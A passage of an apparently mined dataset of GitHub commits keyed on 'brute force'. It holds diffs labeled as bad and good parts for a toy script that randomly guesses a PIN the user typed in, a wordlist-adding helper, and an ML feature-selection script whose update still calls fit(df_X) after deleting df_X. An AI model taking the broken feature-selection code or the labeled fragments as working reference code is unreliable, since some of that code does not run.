100%\nrename from Password Atlas\/V3.Arsenal-90.torrent\nrename to Passwords Atlas\/Dictionary Downloads\/V3.Arsenal-90.torrent\ndiff --git a\/Password Atlas\/File Spliter\/Dictionary\/Test.txt b\/Passwords Atlas\/Test.txt\nsimilarity index 100%\nrename from Password Atlas\/File Spliter\/Dictionary\/Test.txt\nrename to Passwords Atlas\/Test.txt\n","message":"","files":{"\/.BruteForce.py":{"changes":[{"diff":"\n # Usefull for PIN Cracking# For string module documentation: https:\/\/docs.python.org\/3\/library\/string.html\n import string\n \n-chars = string.printable[:10] # :95 for the full characters list\n+# We import time module for the function sleep\n+import time\n+\n+menu_options = {\n+    1: 'Digits (Default)            [0123456789]',\n+    2: 'HEX Digits                  [0123456789abcdefABCDEF]',\n+    3: 'Lowercase letters           [abcdefghijklmnopqrstuvwxyz]',\n+    4: 'Uppercase letters           [ABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n+    5: 'All letters                 [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n+    6: 'All numbers and letters     [0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n+    7: 'All possible characters     [digits, letters, punctuation and whitespace]',   \n+}\n+\n+def print_menu():\n+    for key in menu_options.keys():\n+        print (key, '--', menu_options[key] )\n+\n+print_menu()\n+\n+if __name__=='__main__':\n+    while(True):\n+        try:\n+            print ()\n+            print(' Below you will be asked to select the type of characters that you want to include in the attack.')\n+            print(' Have in mind that selecting a password outside the character range will end in a infinite shooting without success.')\n+            print()\n+            option = int(input('Select your bullets (char type): '))\n+        except:\n+            print('Wrong input. Please enter a number ...')\n+        # Check what choice was entered and act accordingly\n+        if option == 1:\n+            chars = string.digits\n+            print()\n+            print('You selected DIGITS Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 2:\n+            chars = string.hexdigits\n+            print()\n+            print('You selected HEXDIGITS Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 3:\n+            chars = string.ascii_lowercase\n+            print()\n+            print('You selected LOWERCASE Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 4:\n+            chars = string.ascii_uppercase\n+            print()\n+            print('You selected UPPERCASE Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 5:\n+            chars = string.ascii_letters\n+            print()\n+            print('You selected ABECEDARY Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 6:\n+            chars = string.printable[:62]\n+            print()\n+            print('You selected ARMOR-PIERCING Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        elif option == 7:\n+            chars = string.printable[:95]\n+            print()\n+            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n+            break\n+        else:\n+            chars = string.digits\n+            print('Invalid option. Running Default Mode (PIN Cracker).')\n+            break\n+\n chars_list = list(chars)\n \n password = pyautogui.password(\"Enter a PIN\/Password: \")\n guess_password = \"\"\n+print()\n+print(\"Preparing to launch the bullets rain..\")\n+time.sleep(3)\n \n while(guess_password != password):\n \tguess_password = random.choices(chars_list, k=len(password))\n-\tprint(\"<===========\"+ str(guess_password) + \"===========>\")\n+\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))\n \n \tif(guess_password == list(password)):\n \t\tprint(\"Your PIN\/Password is: \" + \"\".join(guess_password))\n \t\tbreak\n \t\texit\n \n+\n+","add":76,"remove":2,"filename":"\/.BruteForce.py","badparts":["chars = string.printable[:10] # :95 for the full characters list","\tprint(\"<===========\"+ str(guess_password) + \"===========>\")"],"goodparts":["import time","menu_options = {","    1: 'Digits (Default)            [0123456789]',","    2: 'HEX Digits                  [0123456789abcdefABCDEF]',","    3: 'Lowercase letters           [abcdefghijklmnopqrstuvwxyz]',","    4: 'Uppercase letters           [ABCDEFGHIJKLMNOPQRSTUVWXYZ]',","    5: 'All letters                 [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',","    6: 'All numbers and letters     [0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',","    7: 'All possible characters     [digits, letters, punctuation and whitespace]',   ","}","def print_menu():","    for key in menu_options.keys():","        print (key, '--', menu_options[key] )","print_menu()","if __name__=='__main__':","    while(True):","        try:","            print ()","            print(' Below you will be asked to select the type of characters that you want to include in the attack.')","            print(' Have in mind that selecting a password outside the character range will end in a infinite shooting without success.')","            print()","            option = int(input('Select your bullets (char type): '))","        except:","            print('Wrong input. Please enter a number ...')","        if option == 1:","            chars = string.digits","            print()","            print('You selected DIGITS Bullets ' + \"(\" +chars+ \")\")","            break","        elif option == 2:","            chars = string.hexdigits","            print()","            print('You selected HEXDIGITS Bullets ' + \"(\" +chars+ \")\")","            break","        elif option == 3:","            chars = string.ascii_lowercase","            print()","            print('You selected LOWERCASE Bullets ' + \"(\" +chars+ \")\")","            break","        elif option == 4:","            chars = string.ascii_uppercase","            print()","            print('You selected UPPERCASE Bullets ' + \"(\" +chars+ \")\")","            break","        elif option == 5:","            chars = string.ascii_letters","            print()","            print('You selected ABECEDARY Bullets ' + \"(\" +chars+ \")\")","            break","        elif option == 6:","            chars = string.printable[:62]","            print()","            print('You selected ARMOR-PIERCING Bullets ' + \"(\" +chars+ \")\")","            break","        elif option == 7:","            chars = string.printable[:95]","            print()","            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")","            break","        else:","            chars = string.digits","            print('Invalid option. Running Default Mode (PIN Cracker).')","            break","print()","print(\"Preparing to launch the bullets rain..\")","time.sleep(3)","\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))"]}],"source":"\n\nimport random import pyautogui import string chars=string.printable[:10] chars_list=list(chars) password=pyautogui.password(\"Enter a PIN\/Password: \") guess_password=\"\" while(guess_password !=password): \tguess_password=random.choices(chars_list, k=len(password)) \tprint(\"<===========\"+str(guess_password) +\"===========>\") \tif(guess_password==list(password)): \t\tprint(\"Your PIN\/Password is: \" +\"\".join(guess_password)) \t\tbreak \t\texit ","sourceWithComments":"# We use random module to generate random numbers\nimport random\n\n# We use pyautogui to generate a more modern and interactive input box outside the console\nimport pyautogui\n\n# We use string module to get all the possible characters, altough we will be using only numbers (PIN Cracking) to make the Brute Force Faster\n# Usefull for PIN Cracking# For string module documentation: https:\/\/docs.python.org\/3\/library\/string.html\nimport string\n\nchars = string.printable[:10] # :95 for the full characters list\nchars_list = list(chars)\n\npassword = pyautogui.password(\"Enter a PIN\/Password: \")\nguess_password = \"\"\n\nwhile(guess_password != password):\n\tguess_password = random.choices(chars_list, k=len(password))\n\tprint(\"<===========\"+ str(guess_password) + \"===========>\")\n\n\tif(guess_password == list(password)):\n\t\tprint(\"Your PIN\/Password is: \" + \"\".join(guess_password))\n\t\tbreak\n\t\texit\n\n"}},"msg":"Major changes to File Splitter and Brute Force Scripts"},"83aee69bf786c53f391be446717928dcd9601a69":{"url":"https:\/\/api.github.com\/repos\/yonasuriv\/MGK\/commits\/83aee69bf786c53f391be446717928dcd9601a69","html_url":"https:\/\/github.com\/yonasuriv\/MGK\/commit\/83aee69bf786c53f391be446717928dcd9601a69","message":"Updated Brute Force Script and GUI","sha":"83aee69bf786c53f391be446717928dcd9601a69","keyword":"brute force update","diff":"diff --git a\/.ADDPWD.py b\/.ADDPWD.py\nindex 11a310b..5567b6f 100644\n--- a\/.ADDPWD.py\n+++ b\/.ADDPWD.py\n@@ -1,4 +1,19 @@\n-password = input(\"Enter the password you want add to the Dictionary: \\n\")\n+# Adding colors to the terminal\n+class bcolors:\n+    HEADER = '\\033[95m'\n+    OKBLUE = '\\033[94m'\n+    OKCYAN = '\\033[96m'\n+    OKGREEN = '\\033[92m'\n+    WARNING = '\\033[93m'\n+    FAIL = '\\033[91m'\n+    ENDC = '\\033[0m'\n+    BOLD = '\\033[1m'\n+    UNDERLINE = '\\033[4m'\n \n-with open('Passwords-List.txt', 'a') as f:\n+password = input(f\"Enter the password you want add to the Dictionary: {bcolors.OKGREEN}\")\n+print(f\"{bcolors.ENDC}\")\n+\n+with open('Wordlists\/Wordlist.txt', 'a') as f:\n     print(password, file=f)\n+    print(f\"{bcolors.OKGREEN}{password} added to the wordlist successfully!{bcolors.ENDC}\")\n+    print()\ndiff --git a\/.BruteForce.py b\/.BruteForce.py\nindex 609d363..be4fb25 100644\n--- a\/.BruteForce.py\n+++ b\/.BruteForce.py\n@@ -84,11 +84,12 @@ def print_menu():\n         elif option == 7:\n             chars = string.printable[:95]\n             print()\n-            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n+            print(f'{bcolors.WARNING}You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n             break\n         else:\n             chars = string.digits\n-            print('Invalid option. Running Default Mode (PIN Cracker).')\n+            print()\n+            print(f'{bcolors.FAIL}Invalid option. {bcolors.WARNING}Running PIN CRACKER Default Mode (0123456789)')\n             break\n \n # Taking the character lists from the user selection\n@@ -96,7 +97,7 @@ def print_menu():\n \n print()\n print(f'{bcolors.FAIL}WARNING: Selecting a Password OUTSIDE the Character Range will end in a Infinite Loop, shooting WITHOUT success.{bcolors.ENDC}')\n-time.sleep(3)\n+# time.sleep(3)\n \n # Password GUI\n password = pyautogui.password(\"Enter a PIN\/Password: \")\n@@ -113,7 +114,7 @@ def print_menu():\n # If password is not equal to the one entered, it will keep performing the brute force attack showing the random characters used\n while(guess_password != password):\n \tguess_password = random.choices(chars_list, k=len(password))\n-\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))\n+\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500  \"+ \"   \" + str(guess_password))\n \tprint()\n \n # If the password is equal to the one entered, it will show the final output (result)\n","files":{"\/.ADDPWD.py":{"changes":[{"diff":"\n-password = input(\"Enter the password you want add to the Dictionary: \\n\")\n+# Adding colors to the terminal\n+class bcolors:\n+    HEADER = '\\033[95m'\n+    OKBLUE = '\\033[94m'\n+    OKCYAN = '\\033[96m'\n+    OKGREEN = '\\033[92m'\n+    WARNING = '\\033[93m'\n+    FAIL = '\\033[91m'\n+    ENDC = '\\033[0m'\n+    BOLD = '\\033[1m'\n+    UNDERLINE = '\\033[4m'\n \n-with open('Passwords-List.txt', 'a') as f:\n+password = input(f\"Enter the password you want add to the Dictionary: {bcolors.OKGREEN}\")\n+print(f\"{bcolors.ENDC}\")\n+\n+with open('Wordlists\/Wordlist.txt', 'a') as f:\n     print(password, file=f)\n+    print(f\"{bcolors.OKGREEN}{password} added to the wordlist successfully!{bcolors.ENDC}\")\n+    print()","add":17,"remove":2,"filename":"\/.ADDPWD.py","badparts":["password = input(\"Enter the password you want add to the Dictionary: \\n\")","with open('Passwords-List.txt', 'a') as f:"],"goodparts":["class bcolors:","    HEADER = '\\033[95m'","    OKBLUE = '\\033[94m'","    OKCYAN = '\\033[96m'","    OKGREEN = '\\033[92m'","    WARNING = '\\033[93m'","    FAIL = '\\033[91m'","    ENDC = '\\033[0m'","    BOLD = '\\033[1m'","    UNDERLINE = '\\033[4m'","password = input(f\"Enter the password you want add to the Dictionary: {bcolors.OKGREEN}\")","print(f\"{bcolors.ENDC}\")","with open('Wordlists\/Wordlist.txt', 'a') as f:","    print(f\"{bcolors.OKGREEN}{password} added to the wordlist successfully!{bcolors.ENDC}\")","    print()"]}],"source":"\npassword=input(\"Enter the password you want add to the Dictionary: \\n\") with open('Passwords-List.txt', 'a') as f: print(password, file=f) ","sourceWithComments":"password = input(\"Enter the password you want add to the Dictionary: \\n\")\n\nwith open('Passwords-List.txt', 'a') as f:\n    print(password, file=f)\n"},"\/.BruteForce.py":{"changes":[{"diff":"\n         elif option == 7:\n             chars = string.printable[:95]\n             print()\n-            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n+            print(f'{bcolors.WARNING}You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n             break\n         else:\n             chars = string.digits\n-            print('Invalid option. Running Default Mode (PIN Cracker).')\n+            print()\n+            print(f'{bcolors.FAIL}Invalid option. {bcolors.WARNING}Running PIN CRACKER Default Mode (0123456789)')\n             break\n \n # Taking the character lists from the user selection\n","add":3,"remove":2,"filename":"\/.BruteForce.py","badparts":["            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")","            print('Invalid option. Running Default Mode (PIN Cracker).')"],"goodparts":["            print(f'{bcolors.WARNING}You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")","            print()","            print(f'{bcolors.FAIL}Invalid option. {bcolors.WARNING}Running PIN CRACKER Default Mode (0123456789)')"]},{"diff":"\n \n print()\n print(f'{bcolors.FAIL}WARNING: Selecting a Password OUTSIDE the Character Range will end in a Infinite Loop, shooting WITHOUT success.{bcolors.ENDC}')\n-time.sleep(3)\n+# time.sleep(3)\n \n # Password GUI\n password = pyautogui.password(\"Enter a PIN\/Password: \")\n","add":1,"remove":1,"filename":"\/.BruteForce.py","badparts":["time.sleep(3)"],"goodparts":[]},{"diff":"\n # If password is not equal to the one entered, it will keep performing the brute force attack showing the random characters used\n while(guess_password != password):\n \tguess_password = random.choices(chars_list, k=len(password))\n-\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))\n+\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500  \"+ \"   \" + str(guess_password))\n \tprint()\n \n # If the password is equal to the one entered, it will show the final output (result)\n","add":1,"remove":1,"filename":"\/.BruteForce.py","badparts":["\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))"],"goodparts":["\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500  \"+ \"   \" + str(guess_password))"]}],"source":"\n\nimport random import pyautogui import string import time class bcolors: HEADER='\\033[95m' OKBLUE='\\033[94m' OKCYAN='\\033[96m' OKGREEN='\\033[92m' WARNING='\\033[93m' FAIL='\\033[91m' ENDC='\\033[0m' BOLD='\\033[1m' UNDERLINE='\\033[4m' menu_options={ 1: 'Digits [0123456789]', 2: 'HEX Digits [0123456789abcdefABCDEF]', 3: 'Lowercase letters [abcdefghijklmnopqrstuvwxyz]', 4: 'Uppercase letters [ABCDEFGHIJKLMNOPQRSTUVWXYZ]', 5: 'All letters [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]', 6: 'All numbers and letters [0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]', 7: 'All possible characters [digits, letters, punctuation and whitespace]', } def print_menu(): for key in menu_options.keys(): print(key, '--', menu_options[key]) print_menu() if __name__=='__main__': while(True): try: print() option=int(input('Select the bullets you want to use in the attack(1-7): ')) except: print('Wrong input. Please enter a number between 1 and 7.') if option==1: chars=string.digits print() print(f'{bcolors.WARNING}You selected DIGITS Bullets ' +\"(\" +chars+\")\") break elif option==2: chars=string.hexdigits print() print(f'{bcolors.WARNING}You selected HEXDIGITS Bullets ' +\"(\" +chars+\")\") break elif option==3: chars=string.ascii_lowercase print() print(f'{bcolors.WARNING}You selected LOWERCASE Bullets ' +\"(\" +chars+\")\") break elif option==4: chars=string.ascii_uppercase print() print(f'{bcolors.WARNING}You selected UPPERCASE Bullets ' +\"(\" +chars+\")\") break elif option==5: chars=string.ascii_letters print() print(f'{bcolors.WARNING}You selected ABECEDARY Bullets ' +\"(\" +chars+\")\") break elif option==6: chars=string.printable[:62] print() print(f'{bcolors.WARNING}You selected ARMOR-PIERCING Bullets ' +\"(\" +chars+\")\") break elif option==7: chars=string.printable[:95] print() print('You selected GODKILLER Bullets ' +\"(\" +chars+\")\") break else: chars=string.digits print('Invalid option. Running Default Mode(PIN Cracker).') break chars_list=list(chars) print() print(f'{bcolors.FAIL}WARNING: Selecting a Password OUTSIDE the Character Range will end in a Infinite Loop, shooting WITHOUT success.{bcolors.ENDC}') time.sleep(3) password=pyautogui.password(\"Enter a PIN\/Password: \") guess_password=\"\" print() print(f\"{bcolors.OKGREEN}Preparing to launch the Bullets Rain..{bcolors.ENDC}\") print() time.sleep(3) while(guess_password !=password): \tguess_password=random.choices(chars_list, k=len(password)) \tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+\" \" +str(guess_password)) \tprint() \tif(guess_password==list(password)): \t\tprint(\"\ud83c\udd83\ud83c\udd77\ud83c\udd74 \ud83c\udd75\ud83c\udd7e\ud83c\udd81\ud83c\udd72\ud83c\udd74\ud83c\udd73 \ud83c\udd7f\ud83c\udd70\ud83c\udd82\ud83c\udd82\ud83c\udd86\ud83c\udd7e\ud83c\udd81\ud83c\udd73 \ud83c\udd86\ud83c\udd70\ud83c\udd82 \" +\"\".join(guess_password)) \t\tprint() \t\tbreak \t\texit ","sourceWithComments":"# Using random module to generate random numbers\nimport random\n\n# Using pyautogui to generate a more modern and interactive input box outside the console\nimport pyautogui\n\n# Using string module to get all the possible characters\n# For string module documentation: https:\/\/docs.python.org\/3\/library\/string.html\nimport string\n\n# Using time module for the function sleep\nimport time\n\n# Adding colors to the terminal\nclass bcolors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKCYAN = '\\033[96m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\n# Creating a menu option to let the user decide which type of characters want to use for the brute force\nmenu_options = {\n    1: 'Digits                      [0123456789]',\n    2: 'HEX Digits                  [0123456789abcdefABCDEF]',\n    3: 'Lowercase letters           [abcdefghijklmnopqrstuvwxyz]',\n    4: 'Uppercase letters           [ABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n    5: 'All letters                 [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n    6: 'All numbers and letters     [0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]',\n    7: 'All possible characters     [digits, letters, punctuation and whitespace]',   \n}\n\n# Making the menu interactive\ndef print_menu():\n    for key in menu_options.keys():\n        print (key, '--', menu_options[key] )\n        \n# Print the menu\nprint_menu()\n\n# Adding the values to each of the options on the menu\nif __name__=='__main__':\n    while(True):\n        try:\n            print()\n            option = int(input('Select the bullets you want to use in the attack (1-7): '))\n        except:\n            print('Wrong input. Please enter a number between 1 and 7.')\n        # Check what choice was entered and act accordingly\n        if option == 1:\n            chars = string.digits\n            print()\n            print(f'{bcolors.WARNING}You selected DIGITS Bullets ' + \"(\" +chars+ \")\")\n            break\n        elif option == 2:\n            chars = string.hexdigits\n            print()\n            print(f'{bcolors.WARNING}You selected HEXDIGITS Bullets ' + \"(\" +chars+ \")\")\n            break\n        elif option == 3:\n            chars = string.ascii_lowercase\n            print()\n            print(f'{bcolors.WARNING}You selected LOWERCASE Bullets ' + \"(\" +chars+ \")\")\n            break\n        elif option == 4:\n            chars = string.ascii_uppercase\n            print()\n            print(f'{bcolors.WARNING}You selected UPPERCASE Bullets ' + \"(\" +chars+ \")\")\n            break\n        elif option == 5:\n            chars = string.ascii_letters\n            print()\n            print(f'{bcolors.WARNING}You selected ABECEDARY Bullets ' + \"(\" +chars+ \")\")\n            break\n        elif option == 6:\n            chars = string.printable[:62]\n            print()\n            print(f'{bcolors.WARNING}You selected ARMOR-PIERCING Bullets ' + \"(\" +chars+ \")\")\n            break\n        elif option == 7:\n            chars = string.printable[:95]\n            print()\n            print('You selected GODKILLER Bullets ' + \"(\" +chars+ \")\")\n            break\n        else:\n            chars = string.digits\n            print('Invalid option. Running Default Mode (PIN Cracker).')\n            break\n\n# Taking the character lists from the user selection\nchars_list = list(chars)\n\nprint()\nprint(f'{bcolors.FAIL}WARNING: Selecting a Password OUTSIDE the Character Range will end in a Infinite Loop, shooting WITHOUT success.{bcolors.ENDC}')\ntime.sleep(3)\n\n# Password GUI\npassword = pyautogui.password(\"Enter a PIN\/Password: \")\n\n# Leaving the value equal to nothing since we dont want a fixed value, we want an output from the user\nguess_password = \"\"\n\n# Adding sleep time and text output to make the script look more modern\nprint()\nprint(f\"{bcolors.OKGREEN}Preparing to launch the Bullets Rain..{bcolors.ENDC}\")\nprint()\ntime.sleep(3)\n\n# If password is not equal to the one entered, it will keep performing the brute force attack showing the random characters used\nwhile(guess_password != password):\n\tguess_password = random.choices(chars_list, k=len(password))\n\tprint(\"\ufe3b\u2566\u0335\u0335\u0347\u033f\u033f\u033f\u033f\u2564\u2500\u2500\"+ \"   \" + str(guess_password))\n\tprint()\n\n# If the password is equal to the one entered, it will show the final output (result)\n\tif(guess_password == list(password)):\n\t\tprint(\"\ud83c\udd83\ud83c\udd77\ud83c\udd74 \ud83c\udd75\ud83c\udd7e\ud83c\udd81\ud83c\udd72\ud83c\udd74\ud83c\udd73 \ud83c\udd7f\ud83c\udd70\ud83c\udd82\ud83c\udd82\ud83c\udd86\ud83c\udd7e\ud83c\udd81\ud83c\udd73 \ud83c\udd86\ud83c\udd70\ud83c\udd82 \" + \"\".join(guess_password))\n\t\tprint()\n\t\tbreak\n\t\texit\n\n\n\n"}},"msg":"Updated Brute Force Script and GUI"}},"https:\/\/github.com\/mohammedalkhatib69\/Brute-Force-Feature-Selection-Input-Selection-Feature-Combination-Selection":{"b8c039234f6c1a470ec0144ad647baf9c4ca56c7":{"url":"https:\/\/api.github.com\/repos\/mohammedalkhatib69\/Brute-Force-Feature-Selection-Input-Selection-Feature-Combination-Selection\/commits\/b8c039234f6c1a470ec0144ad647baf9c4ca56c7","html_url":"https:\/\/github.com\/mohammedalkhatib69\/Brute-Force-Feature-Selection-Input-Selection-Feature-Combination-Selection\/commit\/b8c039234f6c1a470ec0144ad647baf9c4ca56c7","message":"Update Brute_Force_Feature_Selection.py\n\nSimple python demonstration for feature combination selection","sha":"b8c039234f6c1a470ec0144ad647baf9c4ca56c7","keyword":"brute force update","diff":"diff --git a\/Brute_Force_Feature_Selection.py b\/Brute_Force_Feature_Selection.py\nindex a91e92f..e041fcd 100644\n--- a\/Brute_Force_Feature_Selection.py\n+++ b\/Brute_Force_Feature_Selection.py\n@@ -1,39 +1,50 @@\n+### This is an example using brute force feature selection\/ feature combination selection for a regression problem \r\n+### this code can be reused for a classification problem, you only need to change the model and scoring criteria\r\n+\r\n+## Strat\r\n+# import libraries \r\n import numpy as np\r\n import pandas as pd\r\n from sklearn.preprocessing import MinMaxScaler\r\n from xgboost import XGBRegressor\r\n from sklearn.model_selection import KFold, train_test_split, GridSearchCV\r\n-from sklearn.metrics import confusion_matrix, mean_squared_error\r\n-from sklearn.ensemble import RandomForestRegressor\r\n-from sklearn.svm import SVR\r\n from sklearn.metrics import mean_squared_error\r\n-from math import log\r\n-from sklearn.neighbors import KNeighborsClassifier\r\n-from sklearn.datasets import load_iris\r\n+\r\n+# ExhaustiveFeatureSelector is responsible for brute force feature selection \r\n from mlxtend.feature_selection import ExhaustiveFeatureSelector as EFS\r\n-import pandas as pd\r\n \r\n-train = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\The_hand_crafted\\\\ANN\\\\Train.csv')\r\n+# import training dataset using pandas\r\n+train = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\Train.csv')\r\n \r\n-y = np.array(train.iloc[:, 14], dtype=float)\r\n-X = train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]].values\r\n \r\n+# define your inputs and output, in this case, we have 14 inputs and 1 output, all numeric\r\n+X = np.array(train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]], dtype=float)\r\n+y = np.array(train.iloc[:, 14], dtype=float)\r\n \r\n+# define the model, any model can be used \r\n lr = XGBRegressor(random_state=1)\r\n \r\n+# Deifne the ExhaustiveFeatureSelector paramters, in this case there are 14 ponteital features\/ inputs \r\n+# So we try to map through all of them and select the best feature combination\r\n+# If you are only interested in finding the best feature combination of 3 features only \r\n+# Then you need to define min_features =3 and max features =3 \r\n+# Remember that always min features is either = or < to the max features\r\n+# socring is another important parameter. It defines the selection criteria. you can use R2, MAE, MSE or define your own score\r\n+# in this case, we used 'neg_mean_squared_error because the search will only output the value of the height, so remember -1 is larger than -2\r\n+# deifen cross-validation (CV) the default is 5\r\n+\r\n+\r\n efs = EFS(lr,\r\n-          min_features=4,\r\n-          max_features=4,\r\n+          min_features=1,\r\n+          max_features=14,\r\n           scoring='neg_mean_squared_error',\r\n           print_progress=True,\r\n           cv=5)\r\n \r\n-df_X = pd.DataFrame(X, columns=['ASA','BGN','RMSENG','ZCR','MFCC1','MFCC2','MFCC4','MFCC8','S_Decrease','S_Flatness','S_Flux','S_Rolloff','S_Slope','S_Spread'])\r\n-df_X.head()\r\n-\r\n efs1 = efs.fit(df_X, y)\r\n \r\n print('Best MSE score: %.4f' % efs1.best_score_ * (-1))\r\n print('Best subset (indices):', efs1.best_idx_)\r\n print('Best subset (corresponding names):', efs1.best_feature_names_)\r\n \r\n+## The end ##\r\n","files":{"\/Brute_Force_Feature_Selection.py":{"changes":[{"diff":"\n+### This is an example using brute force feature selection\/ feature combination selection for a regression problem \r\n+### this code can be reused for a classification problem, you only need to change the model and scoring criteria\r\n+\r\n+## Strat\r\n+# import libraries \r\n import numpy as np\r\n import pandas as pd\r\n from sklearn.preprocessing import MinMaxScaler\r\n from xgboost import XGBRegressor\r\n from sklearn.model_selection import KFold, train_test_split, GridSearchCV\r\n-from sklearn.metrics import confusion_matrix, mean_squared_error\r\n-from sklearn.ensemble import RandomForestRegressor\r\n-from sklearn.svm import SVR\r\n from sklearn.metrics import mean_squared_error\r\n-from math import log\r\n-from sklearn.neighbors import KNeighborsClassifier\r\n-from sklearn.datasets import load_iris\r\n+\r\n+# ExhaustiveFeatureSelector is responsible for brute force feature selection \r\n from mlxtend.feature_selection import ExhaustiveFeatureSelector as EFS\r\n-import pandas as pd\r\n \r\n-train = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\The_hand_crafted\\\\ANN\\\\Train.csv')\r\n+# import training dataset using pandas\r\n+train = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\Train.csv')\r\n \r\n-y = np.array(train.iloc[:, 14], dtype=float)\r\n-X = train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]].values\r\n \r\n+# define your inputs and output, in this case, we have 14 inputs and 1 output, all numeric\r\n+X = np.array(train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]], dtype=float)\r\n+y = np.array(train.iloc[:, 14], dtype=float)\r\n \r\n+# define the model, any model can be used \r\n lr = XGBRegressor(random_state=1)\r\n \r\n+# Deifne the ExhaustiveFeatureSelector paramters, in this case there are 14 ponteital features\/ inputs \r\n+# So we try to map through all of them and select the best feature combination\r\n+# If you are only interested in finding the best feature combination of 3 features only \r\n+# Then you need to define min_features =3 and max features =3 \r\n+# Remember that always min features is either = or < to the max features\r\n+# socring is another important parameter. It defines the selection criteria. you can use R2, MAE, MSE or define your own score\r\n+# in this case, we used 'neg_mean_squared_error because the search will only output the value of the height, so remember -1 is larger than -2\r\n+# deifen cross-validation (CV) the default is 5\r\n+\r\n+\r\n efs = EFS(lr,\r\n-          min_features=4,\r\n-          max_features=4,\r\n+          min_features=1,\r\n+          max_features=14,\r\n           scoring='neg_mean_squared_error',\r\n           print_progress=True,\r\n           cv=5)\r\n \r\n-df_X = pd.DataFrame(X, columns=['ASA','BGN','RMSENG','ZCR','MFCC1','MFCC2','MFCC4','MFCC8','S_Decrease','S_Flatness','S_Flux','S_Rolloff','S_Slope','S_Spread'])\r\n-df_X.head()\r\n-\r\n efs1 = efs.fit(df_X, y)\r\n \r\n print('Best MSE score: %.4f' % efs1.best_score_ * (-1))\r\n print('Best subset (indices):', efs1.best_idx_)\r\n print('Best subset (corresponding names):', efs1.best_feature_names_)\r\n \r\n+## The end ##\r\n","add":26,"remove":15,"filename":"\/Brute_Force_Feature_Selection.py","badparts":["from sklearn.metrics import confusion_matrix, mean_squared_error\r","from sklearn.ensemble import RandomForestRegressor\r","from sklearn.svm import SVR\r","from math import log\r","from sklearn.neighbors import KNeighborsClassifier\r","from sklearn.datasets import load_iris\r","import pandas as pd\r","train = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\The_hand_crafted\\\\ANN\\\\Train.csv')\r","y = np.array(train.iloc[:, 14], dtype=float)\r","X = train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]].values\r","          min_features=4,\r","          max_features=4,\r","df_X = pd.DataFrame(X, columns=['ASA','BGN','RMSENG','ZCR','MFCC1','MFCC2','MFCC4','MFCC8','S_Decrease','S_Flatness','S_Flux','S_Rolloff','S_Slope','S_Spread'])\r","df_X.head()\r","\r"],"goodparts":["\r","\r","train = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\Train.csv')\r","X = np.array(train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]], dtype=float)\r","y = np.array(train.iloc[:, 14], dtype=float)\r","\r","\r","          min_features=1,\r","          max_features=14,\r"]}],"source":"\nimport numpy as 